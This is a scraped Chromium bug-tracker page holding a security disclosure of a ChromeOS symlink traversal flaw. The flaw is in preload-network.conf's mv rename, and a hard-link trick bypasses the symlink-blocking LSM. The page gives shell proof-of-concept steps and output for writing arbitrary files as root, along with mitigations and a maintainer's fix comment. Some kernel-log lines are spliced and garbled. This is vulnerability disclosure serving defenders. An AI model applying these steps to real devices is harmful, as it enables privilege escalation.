      <div class="select-container">
        <select aria-label="Description history menu" hidden="">
          <!---->
      <option value="0" selected="">
        Description #1 by secur...@ncsc.gov.uk (Aug 18, 2021)
      </option>
    <!---->
        </select>
      </div>
      Summary<span class="line"><!---->Summary<!----></span><br>A symlink traversal vulnerability has been discovered in ChromeOS (versions up to and including v80). The attack described herein bypasses ChromeOS’s symlink mitigations and allows an attacker to write a file anywhere on the system with arbitrary contents. This could lead to privilege escalation and/or unauthorised access to protected resources.<span class="line"><!---->A symlink traversal vulnerability has been discovered in ChromeOS (versions up to and including v80). The attack described herein bypasses ChromeOS’s symlink mitigations and allows an attacker to write a file anywhere on the system with arbitrary contents. This could lead to privilege escalation and/or unauthorised access to protected resources.<!----></span><br><br>Details<span class="line"><!---->Details<!----></span><br>Introduction<span class="line"><!---->Introduction<!----></span><br>On ChromeOS /var/lib/preload-network-driver is intended to keep the "time to first ad impression" metric low by calling modprobe with the network driver that was used last time earlier on in the boot process. Conveniently this is on the encrypted stateful partition.<span class="line"><!---->On ChromeOS /var/lib/preload-network-driver is intended to keep the "time to first ad impression" metric low by calling modprobe with the network driver that was used last time earlier on in the boot process. Conveniently this is on the encrypted stateful partition.<!----></span><br>This file (and its forerunners) has been the subject of security bugs before and thus it is now locked down, primarily such that only one argument can be passed to the modprobe call. If the call to modprobe fails, then the failing file is renamed to /var/lib/preload-network-driver.bad and ignored after that.<span class="line"><!---->This file (and its forerunners) has been the subject of security bugs before and thus it is now locked down, primarily such that only one argument can be passed to the modprobe call. If the call to modprobe fails, then the failing file is renamed to /var/lib/preload-network-driver.bad and ignored after that.<!----></span><br><br>The Bug<span class="line"><!---->The Bug<!----></span><br>The reading of the preload-network-driver file is handled by /etc/init/preload-network.conf:<span class="line"><!---->The reading of the preload-network-driver file is handled by /etc/init/preload-network.conf:<!----></span><br><br>env drvfile=/var/lib/preload-network-drivers<span class="line"><!---->env drvfile=/var/lib/preload-network-drivers<!----></span><br>pre-start script<span class="line"><!---->pre-start script<!----></span><br># If the drivers for Ethernet or WiFi devices are modules, our post-stop<span class="line"><!----># If the drivers for Ethernet or WiFi devices are modules, our post-stop<!----></span><br># script will have recorded the driver names on the previous boot cycle.<span class="line"><!----># script will have recorded the driver names on the previous boot cycle.<!----></span><br># Load those drivers now so shill can config the network sooner,<span class="line"><!----># Load those drivers now so shill can config the network sooner,<!----></span><br># ideally by the time login screen is up.<span class="line"><!----># ideally by the time login screen is up.<!----></span><br>#<span class="line"><!---->#<!----></span><br># Note: failure to probe the module here is NOT fatal. if [ -s $drvfile ] ; then<span class="line"><!----># Note: failure to probe the module here is NOT fatal. if [ -s $drvfile ] ; then<!----></span><br>for drv in $(head -1 $drvfile); do if ! modprobe -q -- "${drv}"; then<span class="line"><!---->for drv in $(head -1 $drvfile); do if ! modprobe -q -- "${drv}"; then<!----></span><br># If modprobe didn't like the alias file for some reason, just # move it out of the way. The post-stop script will make a new # one.<span class="line"><!----># If modprobe didn't like the alias file for some reason, just # move it out of the way. The post-stop script will make a new # one.<!----></span><br>mv $drvfile $drvfile.bad<span class="line"><!---->mv $drvfile $drvfile.bad<!----></span><br>logger -t "$UPSTART_JOB" \<span class="line"><!---->logger -t "$UPSTART_JOB" \<!----></span><br>"modprobe $drv failed. Renamed $drvfile with .bad suffix." fi<span class="line"><!---->"modprobe $drv failed. Renamed $drvfile with .bad suffix." fi<!----></span><br>done fi<span class="line"><!---->done fi<!----></span><br>end script<span class="line"><!---->end script<!----></span><br><br>Interestingly, in the failing case, mv is used to perform the renaming. However, in a number of circumstances mv’s behaviour is more complex than just a wrapper around rename(2).<span class="line"><!---->Interestingly, in the failing case, mv is used to perform the renaming. However, in a number of circumstances mv’s behaviour is more complex than just a wrapper around rename(2).<!----></span><br><br>By creating a symlink /var/lib/preload-network-drivers.bad pointing somewhere we can cause a file called preload-network-drivers to be written anywhere root (as init) can write, with content we control. The only restriction on the file contents is that the space delimited word of the first line must cause `modprobe -q -- "word"` to return an error.<span class="line"><!---->By creating a symlink /var/lib/preload-network-drivers.bad pointing somewhere we can cause a file called preload-network-drivers to be written anywhere root (as init) can write, with content we control. The only restriction on the file contents is that the space delimited word of the first line must cause `modprobe -q -- "word"` to return an error.<!----></span><br><br>Proof Of Concept<span class="line"><!---->Proof Of Concept<!----></span><br>To prove the bug we're going to try and use it to write to /var/run/lock, as that shouldn't be possible. At this point if we just naively create a symlink then we get hit by ChromeOS's primary mitigation against persistence bugs that rely on symlinks:<span class="line"><!---->To prove the bug we're going to try and use it to write to /var/run/lock, as that shouldn't be possible. At this point if we just naively create a symlink then we get hit by ChromeOS's primary mitigation against persistence bugs that rely on symlinks:<!----></span><br><br>localhost /var/lib # ln -s /var/run/lock preload-network-drivers.bad localhost /var/lib # ls preload-network-drivers.bad<span class="line"><!---->localhost /var/lib # ln -s /var/run/lock preload-network-drivers.bad localhost /var/lib # ls preload-network-drivers.bad<!----></span><br>ls: cannot access 'preload-network-drivers.bad': Permission denied<span class="line"><!---->ls: cannot access 'preload-network-drivers.bad': Permission denied<!----></span><br><br>There's an LSM which causes the "Permission denied" message:<span class="line"><!---->There's an LSM which causes the "Permission denied" message:<!----></span><br><br>[ 88.774864] ------------[ cut here ]------------<span class="line"><!---->[ 88.774864] ------------[ cut here ]------------<!----></span><br>[ 88.774882] Blocked symlink 723ad5bbd355f926 ]---<!----></span><br><br>However, this isn’t actually “game over”: although links in /var is one such place that's covered by this we can still bypass this anti-symlink protection, perhaps slightly ironically by using another symlink and a hard link. Inside chromeos_startup is this code:<span class="line"><!---->However, this isn’t actually “game over”: although links in /var is one such place that's covered by this we can still bypass this anti-symlink protection, perhaps slightly ironically by using another symlink and a hard link. Inside chromeos_startup is this code:<!----></span><br><br>if [ "${DISABLE_STATEFUL_SECURITY_HARDENING}" = "false" ]; then<span class="line"><!---->if [ "${DISABLE_STATEFUL_SECURITY_HARDENING}" = "false" ]; then<!----></span><br># Set up symlink traversal and FIFO blocking policy for /var, which may reside # on a separate file system than /mnt/stateful_partition. Block symlink<span class="line"><!----># Set up symlink traversal and FIFO blocking policy for /var, which may reside # on a separate file system than /mnt/stateful_partition. Block symlink<!----></span><br># traversal and opening of FIFOs by default, but allow exceptions in the few # instances where they are used intentionally.<span class="line"><!----># traversal and opening of FIFOs by default, but allow exceptions in the few # instances where they are used intentionally.<!----></span><br>block_symlink_and_fifo /var<span class="line"><!---->block_symlink_and_fifo /var<!----></span><br># Generic symlink exceptions.<span class="line"><!----># Generic symlink exceptions.<!----></span><br>for symlink_exception in /var/cache/echo /var/cache/vpd /var/lib/timezone \<span class="line"><!---->for symlink_exception in /var/cache/echo /var/cache/vpd /var/lib/timezone \<!----></span><br>/var/log /home; do mkdir -p "${symlink_exception}"<span class="line"><!---->/var/log /home; do mkdir -p "${symlink_exception}"<!----></span><br>allow_symlink "${symlink_exception}" done<span class="line"><!---->allow_symlink "${symlink_exception}" done<!----></span><br><br><br>This code deliberately allows for some exceptions to the symlink policy. By picking one of these directories (for example, /var/lib/timezone, since it only has a single symlink in it normally) and using that as a symlink to another allow listed directory we can succeed in pointing /var/lib/timezone to another directory (which must itself allow symlinks):<span class="line"><!---->This code deliberately allows for some exceptions to the symlink policy. By picking one of these directories (for example, /var/lib/timezone, since it only has a single symlink in it normally) and using that as a symlink to another allow listed directory we can succeed in pointing /var/lib/timezone to another directory (which must itself allow symlinks):<!----></span><br><br><br>localhost /var/lib # rm -rf timezone<span class="line"><!---->localhost /var/lib # rm -rf timezone<!----></span><br>localhost /var/lib # ln -s /var/run/lock timezone<span class="line"><!---->localhost /var/lib # ln -s /var/run/lock timezone<!----></span><br>localhost /var/lib # ls -la timezone<span class="line"><!---->localhost /var/lib # ls -la timezone<!----></span><br>lrwxrwxrwx. 1 root root 14 Feb 28 14:26 timezone -> /var/run/lock<span class="line"><!---->lrwxrwxrwx. 1 root root 14 Feb 28 14:26 timezone -&gt; /var/run/lock<!----></span><br><br>If we now reboot, /var/lib/timezone will be added to the allow_symlink list1. The "mkdir -p" fails, since this is performed before the allow_symlink, and logs:<span class="line"><!---->If we now reboot, /var/lib/timezone will be added to the allow_symlink list1. The "mkdir -p" fails, since this is performed before the allow_symlink, and logs:<!----></span><br><br>[ 1.690832] ------------[ cut here ]------------<span class="line"><!---->[ 1.690832] ------------[ cut here ]------------<!----></span><br>[ 1.690838] Blocked symlink traversal for path fd:0:/var/lib/timezone (see <span class="line"><!---->[ 1.690838] Blocked symlink traversal for path fd:0:/var/lib/timezone (see <!----></span>https://goo.gl/8xICW6<a class="undefined" target="_blank" href="https://goo.gl/8xICW6"><!---->https://goo.gl/8xICW6<!----></a> for context and rationale)<span class="line"><!----> for context and rationale)<!----></span><br>[ 1.690880] WARNING: CPU: 1 PID: 279 at ../../../../../tmp/portage/sys- kernel/chromeos-kernel-4_19-4.19.87-r983/work/chromeos-kernel-4_19- 4.19.87/security/chromiumos/lsm.c:302 chromiumos_security_inode_follow_link+0xae/0xbb [ 1.690884] Modules linked in:<span class="line"><!---->[ 1.690880] WARNING: CPU: 1 PID: 279 at ../../../../../tmp/portage/sys- kernel/chromeos-kernel-4_19-4.19.87-r983/work/chromeos-kernel-4_19- 4.19.87/security/chromiumos/lsm.c:302 chromiumos_security_inode_follow_link+0xae/0xbb [ 1.690884] Modules linked in:<!----></span><br>[ 1.690893] CPU: 1 PID: 279 Comm: mkdir Not tainted 4.19.87-g626a686c8-dirty #5<span class="line"><!---->[ 1.690893] CPU: 1 PID: 279 Comm: mkdir Not tainted 4.19.87-g626a686c8-dirty #5<!----></span><br>[ 1.690895] Hardware name: VMware, Inc. VMware7,1/440BX Desktop Reference Platform, BIOS VMW71.00V.14410784.B64.1908150010 08/15/2019<span class="line"><!---->[ 1.690895] Hardware name: VMware, Inc. VMware7,1/440BX Desktop Reference Platform, BIOS VMW71.00V.14410784.B64.1908150010 08/15/2019<!----></span><br>[ 1.690899] RIP: 0010:chromiumos_security_inode_follow_link+0xae/0xbb<span RIP: 0033:0x7bc185b8c895<span class="line"><!---->[ 1.691065] RIP: 0033:0x7bc185b8c895<!----></span><br>[ 1.691067]Code:3314252800000075064883c4105dc3e89129020090 48 89 f0 83 ff 01 77 30 48 89 c7 48 89 d6 b8 04 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 03 f3 c3 90 48 8b 15 a1 45 2c 00 f7 d8 64 89<span class="line"><!---->[ 1.691067]Code:3314252800000075064883c4105dc3e89129020090 48 89 f0 83 ff 01 77 0000000000000004<span class="line"><!---->[ 1.691069] RSP: 002b:00007ffec5c3f218 EFLAGS: 00000246 ORIG_RAX: 0000000000000004<!----></span><br>[ 1.691072] RAX: ffffffffffffffda RBX: 00005a22aa3ff601 RDI: 00007ffec5c40f11<span class="line"><!---->[ 1.691075] RDX: 00007ffec5c3f260 RSI: 00007ffec5c3f260 RDI: 00007ffec5c40f11<!----></span><br>[ 1.691077] RBP: 00007ffec5c3f320 R08: 00000000000001ff R09: 00005a22aa3ff840<span class="line"><!---->[ 1.691077] RBP: 00007ffec5c3f320 R08: 00000000000001ff R09: 00005a22aa3ff840<!----></span><br>[ 1.691079] R10: 0000000000000000 R11: 0000000000000246 R12: 00007ffec5c40f08<span class="line"><!---->[ 1.691079] R10: 0000000000000000 R11: 0000000000000246 R12: 00007ffec5c40f08<!----></span><br>[ 1.691081] R13: 00000000000001ff R14: 00007ffec5c40f11 R15: 0000000000000011<span class="line"><!---->[ 1.691081] R13: 00000000000001ff R14: 00007ffec5c40f11 R15: 0000000000000011<!----></span><br>[ 1.691084] ---[ end trace 3719ea5ff8991b69 ]---<span class="line"><!---->[ 1.691084] ---[ end trace 3719ea5ff8991b69 ]---<!----></span><br><br>But ultimately we still end up with /var/lib/timezone being an allowed symlink to another location. This still hasn't succeeded in our aim of making /var/lib/preload-network-drivers.bad be a symlink, but due to the way the symlink traversal policy is implemented, if we make /var/lib/preload-network-drivers.bad be a hard link to /var/lib/timezone, then when the allow_symlink happens it will apply to both paths. The root of the bug here is that although the symlink traversal policy is designed in terms of inodes. This mismatch is a fundamental flaw in the way the ChromeOS LSM works – its unit of currency is an inode, but inodes can be exposed through more than one link.<span class="line"><!---->But ultimately we still end up with /var/lib/timezone being an allowed symlink to another location. This still hasn't succeeded in our aim of making /var/lib/preload-network-drivers.bad be a symlink, but due to the way the symlink traversal policy is implemented, if we make /var/lib/preload-network-drivers.bad be a hard link to /var/lib/timezone, then when the allow_symlink happens it will apply to both paths. The root of the bug here is that although the symlink traversal policy is designed in terms of inodes. This mismatch is a fundamental flaw in the way the ChromeOS LSM works – its unit of currency is an inode, but inodes can be exposed through more than one link.<!----></span><br><br>localhost /var/lib # rm -rf timezone/<span class="line"><!---->localhost /var/lib # rm -rf timezone/<!----></span><br>localhost /var/lib # ln -s /var/run/lock timezone<span class="line"><!---->localhost /var/lib # ln -s /var/run/lock timezone<!----></span><br>localhost /var/lib # ls -la timezone<span class="line"><!---->localhost /var/lib # ls -la timezone<!----></span><br>lrwxrwxrwx. 1 root root 13 Mar 2 11:04 timezone -> /var/run/lock localhost /var/lib # ls -la timezone/<span class="line"><!---->lrwxrwxrwx. 1 root root 13 Mar 2 11:04 timezone -&gt; /var/run/lock localhost /var/lib # ls -la timezone/<!----></span><br>ls: cannot access 'timezone/': Permission denied<span class="line"><!---->ls: cannot access 'timezone/': Permission denied<!----></span><br>localhost /var/lib # ln timezone preload-network-drivers.bad localhost /var/lib # echo blahblah > preload-network-drivers<span class="line"><!---->localhost /var/lib # ln timezone preload-network-drivers.bad localhost /var/lib # echo blahblah &gt; preload-network-drivers<!----></span><br><br><br>After a reboot, we can now see this:<span class="line"><!---->After a reboot, we can now see this:<!----></span><br><br> localhost /var/lib # cat /var/run/lock/preload-network-drivers blahblah<span class="line"><!----> localhost /var/lib # cat /var/run/lock/preload-network-drivers blahblah<!----></span><br> <span class="line"><!----> <!----></span><br>And just to prove we haven’t broken the real timezone symlinks:<span class="line"><!---->And just to prove we haven’t broken the real timezone symlinks:<!----></span><br><br> localhost /var/lib # hexdump -C /var/lib/timezone/localtime |head -n1<span class="line"><!----> localhost /var/lib # hexdump -C /var/lib/timezone/localtime |head -n1<!----></span><br> 00000000 54 5a 69 66 32 00 00 00 00 00 00 00 00 00 00 00 |TZif2...........|<span class="line"><!----> 00000000 54 5a 69 66 32 00 00 00 00 00 00 00 00 00 00 00 |TZif2...........|<!----></span><br> <span class="line"><!----> <!----></span><br> Mitigation<span class="line"><!----> Mitigation<!----></span><br>- Use something other than a shell script to perform the loading of the preload driver (at least avoid the use of ‘mv’ to rename the file when modprobe fails).<span class="line"><!---->- Use something other than a shell script to perform the loading of the preload driver (at least avoid the use of ‘mv’ to rename the file when modprobe fails).<!----></span><br>- Revisit the exceptions logic in the LSM; in particular, do not permit the exceptions directory itself to be a symlink.<span class="line"><!---->- Revisit the exceptions logic in the LSM; in particular, do not permit the exceptions directory itself to be a symlink.<!----></span><mr-comment-content></mr-comment-content>

          Comment 3<a class="comment-link" href="?id=1240921#c3">Comment 3<!----></a>

          
        by

        <chops-timestamp title="Mon, Sep 20, 2021, 5:54 PM EDT"></chops-timestamp>
        
          <span class="role-label">Project Member</span>
      
        </div>
        
      </div>
    
      
        
        
      
        chromiumos_resolve_path( ) in security/chromiumos/securityfs.c already tries to check to make sure the path for allow_symlink doesn't contain symlinks. looks like the check doesn't work when the symlink is the last component of the path however, because in that case d_absolute_path() returns the same path it was passed in.<span class="line"><!---->chromiumos_resolve_path( ) in security/chromiumos/securityfs.c already tries to check to make sure the path for allow_symlink doesn't contain symlinks. looks like the check doesn't work when the symlink is the last component of the path however, because in that case d_absolute_path() returns the same path it was passed in.<!----></span><br><br>I'll try to come up with a fix<span class="line"><!---->I'll try to come up with a fix<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>
      <div class="comment-body">
        <mr-comment-content></mr-comment-content>
        <div>
          
        </div>
      </div>

        *** Boilerplate reminders! ***<span class="line"><!---->*** Boilerplate reminders! ***<!----></span><br>Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<span class="line"><!---->Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<!----></span><br><br>Please contact <span class="line"><!---->Please contact <!----></span>security-vrp@chromium.org<a class="undefined" target="_blank" href="mailto:security-vrp@chromium.org"><!---->security-vrp@chromium.org<!----></a> with any questions.<span class="line"><!----> with any questions.<!----></span><br>******************************<span class="line"><!---->******************************<!----></span><mr-comment-content></mr-comment-content>

           issue<h3 class="medium-heading"><!----> issue</h3>
          
            Target project:<label for="targetProjectInput">Target project:</label>
            
              <input id="targetProjectInput" aria-owns="chops-autocomplete-1" aria-autocomplete="both" aria-expanded="false" aria-haspopup="listbox" aria-activedescendant="">
              
      
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }

        <div class="target-project-dialog">
          <h3 class="medium-heading"><!----> issue</h3>
          <div class="input-grid">
            <label for="targetProjectInput">Target project:</label>
            <div>
              <input id="targetProjectInput" aria-owns="chops-autocomplete-1" aria-autocomplete="both" aria-expanded="false" aria-haspopup="listbox" aria-activedescendant="">
              <mr-autocomplete vocabularyname="project" for="targetProjectInput" role="listbox" id="chops-autocomplete-1"><!---->
      <style>
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }
      </style>
      <div class="chops-autocomplete-container">
        <span class="screenreader-hidden" aria-live="polite">
          
        </span>
        <table hidden="">
          <tbody>
            
          </tbody>
        </table>
      </div>
    <!----></mr-autocomplete>
            </div>
          </div>

      <style>
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {

        <slot></slot>
      <button>

runOnLoad(function() {
 // CrDX Feedback Button

 runOnLoad(function() {
 if (typeof(ClientLogger) === "function") {
 let cl = new ClientLogger("issues");
 if (cl.started("new-issue")) {
 cl.logEnd("new-issue", null, 120 * 1000);
 }
 if (cl.started("issue-search")) {
 cl.logEnd("issue-search");
 }
 }
 });
<script type="text/javascript" nonce="">
 runOnLoad(function() {
 if (typeof(ClientLogger) === "function") {
 let cl = new ClientLogger("issues");
 if (cl.started("new-issue")) {
 cl.logEnd("new-issue", null, 120 * 1000);
 }
 if (cl.started("issue-search")) {
 cl.logEnd("issue-search");
 }
 }
 });
</script>
